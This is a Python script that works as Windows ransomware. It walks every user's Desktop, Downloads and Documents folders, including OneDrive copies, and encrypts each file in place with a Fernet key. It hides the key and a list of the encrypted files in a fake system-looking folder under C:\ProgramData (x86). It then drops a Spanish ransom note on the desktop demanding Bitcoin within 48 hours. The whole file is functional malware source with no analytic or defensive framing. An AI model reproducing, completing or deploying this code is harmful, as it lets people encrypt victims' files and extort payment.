import os
from cryptography.fernet import Fernet

def findUsers(directory):
    users = []
    for f in os.scandir(directory):
        if f.name[0].isalpha() and f.is_dir() and not f.name == 'Default User':
            users.append(f.path)
    return users

def findFolders(users, target_dirs):
    folders = []
    for user in users:
        for target in target_dirs:
            nodrive_name = os.path.join(user, target)
            onedrive_name = os.path.join(user, f'OneDrive{target}')
            folders.append(nodrive_name)
            folders.append(onedrive_name)
    clean_folder = []
    for fld in folders:
        if os.path.isdir(fld):
            clean_folder.append(fld)
    return clean_folder

def createFolders(mydirlist):
    for mydir in mydirlist:
        if not os.path.exists(mydir):
            os.makedirs(mydir)

directory = r'C:\users'
users = findUsers(directory)

target_dirs = [
    'Desktop',
    'Downloads',
    'Documents'
]
folders = findFolders(users, target_dirs)


raw_additional_folders = [
    r'C:\Program Files\LibreOffice',
]

additional_folders = []
for fld in raw_additional_folders:
    if os.path.isdir(fld):
        additional_folders.append(fld)

folders_tog = folders + additional_folders
key = Fernet.generate_key()

mydirlist = [
    r'C:\ProgramData (x86)\WindowsPowerShell (x86)',
    r'C:\ProgramData (x86)\Windows Kits',
    r'C:\ProgramData (x86)\Windows Mail',
    r'C:\ProgramData (x86)\Windows Media Player',
    r'C:\ProgramData (x86)\Windows Multimedia Platform',
]

storage = mydirlist [2] 

createFolders(mydirlist)

with open(fr'{storage}\key.txt', 'wb') as f:
    f.write(key)
print(folders_tog)
result = []
count = 0
countr = 0
for folder in folders_tog:
    for dirpath, dirnames, filenames in os.walk(folder):
        for filename in filenames:
            if 0 == count%50:
                print(f'Files Infected {count}')
            countr += 1
            if 0 == countr%50:
                print(f'Files Seen {countr}')
            if filename == 'desktop.ini':
                continue
            if not filename[0].isalpha() \
                and not filename[0].isdigit():
                continue
            name = os.path.join(dirpath, filename)
            with open (name, 'rb') as f:
                content = f.read()
            content_encripted = Fernet(key).encrypt(content)
            try:
                with open (name, 'wb') as f:
                    f.write(content_encripted)
            except Exception as e:
                print(e)
                continue
            result.append(name)
            count += 1 
print(len(result))
with open(fr'{storage}\list.txt', 'w') as f:
    for line in result:
        f.write(f"{line}\n")

username = os.getlogin() 
contents = 'Hemos encriptado todos sus archivos. \n\
Si quereis desencriptarlos teneis 48 horas para enviar \
X BTC a la siguiente direccion \n\
XXXXXX \n\
De lo contrario seran eliminados. \n\
Una vez se haya realizado el pago recibireis \
Instrucciones de como desencriptarlos. \n\
Muchas gracias por su amable colaboracion ;-)'

threatAddress1 = fr'C:\Users\{username}\Desktop'
if os.path.isdir(threatAddress1):
    with open(fr'{threatAddress1}\AVISO_ATAQUE.txt', 'w') as f:
        f.write(contents)

threatAddress2 = fr'C:\Users\{username}\OneDrive\Desktop'
if os.path.isdir(threatAddress2):
    with open(fr'{threatAddress2}\AVISO_ATAQUE.txt', 'w') as f:
        f.write(contents)

